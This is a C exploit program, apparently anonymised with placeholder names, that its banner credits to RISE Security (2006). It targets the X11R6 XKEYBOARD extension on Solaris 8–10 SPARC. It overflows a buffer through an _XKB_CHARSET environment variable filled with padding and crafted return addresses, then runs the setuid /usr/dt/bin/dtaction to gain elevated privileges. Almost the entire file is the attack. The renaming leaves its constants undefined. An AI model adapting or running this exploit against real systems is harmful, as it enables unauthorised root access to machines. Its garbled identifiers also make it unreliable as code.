
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int platform ;
typedef int envp ;
typedef int display ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int FUNC_0 (int,int,int) ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int FUNC_1 (char*,char*,int ,char**) ;
 int FUNC_2 (int ) ;
 scalar_t__ FUNC_3 () ;
 scalar_t__ FUNC_4 (char*) ;
 int FUNC_5 (int ,char*,char*) ;
 int FUNC_6 (char*,char*,int) ;
 int FUNC_7 (char*) ;
 int FUNC_8 (char*) ;
 char* VAR_9 ;
 int FUNC_9 (char*,int,char*,char*) ;
 int FUNC_10 (char*,char*) ;
 int VAR_10 ;
 int FUNC_11 (char*,char*) ;
 int FUNC_12 (int ,char*,int) ;

int FUNC_13(int VAR_11,char **VAR_12){
    char VAR_13[8192],VAR_14[256],VAR_15[256],VAR_16[8][4],*VAR_17[6],*VAR_18;
    int VAR_19,VAR_20,VAR_21,VAR_22=0;

    FUNC_8("X11R6 XKEYBOARD extension Strcmp() for Sun Solaris 8 9 10 SPARC\n");
    FUNC_8("Copyright 2006 RISE Security <contact@risesecurity.org>\n\n");

    if(VAR_11!=3){
        FUNC_5(VAR_10,"usage: %s sprintf|strcpy xserver:display\n",VAR_12[0]);
        FUNC_2(VAR_4);
    }

    if(!FUNC_11(VAR_12[1],"sprintf")) VAR_22=1;
    if(!FUNC_11(VAR_12[1],"strcpy")) VAR_22=2;

    if(!VAR_22){
        FUNC_5(VAR_10,"usage: %s sprintf|strcpy xserver:display\n",VAR_12[0]);
        FUNC_2(VAR_4);
    }

    FUNC_9(VAR_14,sizeof(VAR_14),"DISPLAY=%s",VAR_12[2]);

    if(FUNC_12(VAR_8,VAR_15,sizeof(VAR_15))==-1){
        FUNC_7("sysinfo");
        FUNC_2(VAR_4);
    }

    VAR_19=((int)VAR_12[0]|0xffff);
    VAR_19++;

    VAR_20=VAR_1+VAR_3+VAR_6+VAR_7;
    FUNC_0(VAR_20,1,sizeof(VAR_17)-1);

    *((int *)VAR_16[0])=VAR_19-VAR_20+VAR_1+VAR_2;
    *((int *)VAR_16[1])=VAR_19-VAR_20+VAR_1+VAR_2+VAR_5;
    *((int *)VAR_16[2])=VAR_19-VAR_20+VAR_1+VAR_2+VAR_5+VAR_0;

    switch(VAR_22){
    case 1: *((int *)VAR_16[3])=(int)FUNC_4("sprintf")-4; break;
    case 2: *((int *)VAR_16[3])=(int)FUNC_4("strcpy")-4;
    }

    *((int *)VAR_16[4])=(int)FUNC_3()+4;
    *((int *)VAR_16[5])=*((int *)VAR_16[4])-8;

    VAR_18=VAR_13;
    FUNC_10(VAR_18,"_XKB_CHARSET=");
    VAR_18=VAR_13+13;
    for(VAR_21=0;VAR_21<256;VAR_21++) *VAR_18++='A';
    for(VAR_21=0;VAR_21<66;VAR_21++) *VAR_18++=VAR_16[1][VAR_21%4];
    *VAR_18='\0';

    FUNC_6(VAR_13+13+256+56,VAR_16[0],4);
    FUNC_6(VAR_13+13+256+60,VAR_16[3],4);

    VAR_18=VAR_13+1024;;
    for(VAR_21=0;VAR_21<(VAR_5-1);VAR_21++) *VAR_18++=VAR_16[1][VAR_21%4];
    *VAR_18='\0';

    FUNC_6(VAR_13+1024+32,VAR_16[4],4);
    FUNC_6(VAR_13+1024+36,VAR_16[2],4);
    FUNC_6(VAR_13+1024+60,VAR_16[5],4);

    VAR_18=VAR_13+2048;
    for(VAR_21=0;VAR_21<(VAR_0-1);VAR_21++) *VAR_18++=VAR_16[1][VAR_21%4];
    *VAR_18='\0';

    VAR_17[0]=&VAR_13[0];
    VAR_17[1]=&VAR_13[1024];
    VAR_17[2]=&VAR_13[2048];
    VAR_17[3]=VAR_9;
    VAR_17[4]=VAR_14;
    VAR_17[5]=((void*)0);

    FUNC_1("/usr/dt/bin/dtaction","AAAAAAA",0,VAR_17);

    FUNC_2(VAR_4);
}
